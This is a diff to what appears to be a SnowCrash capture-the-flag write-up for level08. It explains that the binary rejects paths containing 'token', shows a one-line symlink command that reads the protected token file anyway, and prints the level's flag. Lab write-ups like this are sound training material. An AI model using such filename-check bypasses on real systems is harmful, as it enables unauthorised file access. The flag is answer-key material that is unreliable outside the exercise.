@@ -235,3 +235,13 @@ level08@SnowCrash:~$
 Level08 disassembled:
 
 <img width="945" alt="image" src="https://user-images.githubusercontent.com/48088579/148987582-6afaf0c7-cd4f-4975-bf56-f6c44a412473.png">
+
+The binary checks if your argument contains a string `token` in which case the file is not read, we can bypass this easily by making a symbolic link with different name.
+
+Exploit:
+
+```bash
+ln -s /home/user/level08/token /tmp/haha && ./level08 /tmp/haha
+```
+
+Flag: `quif5eloekouj29ke0vouxean`
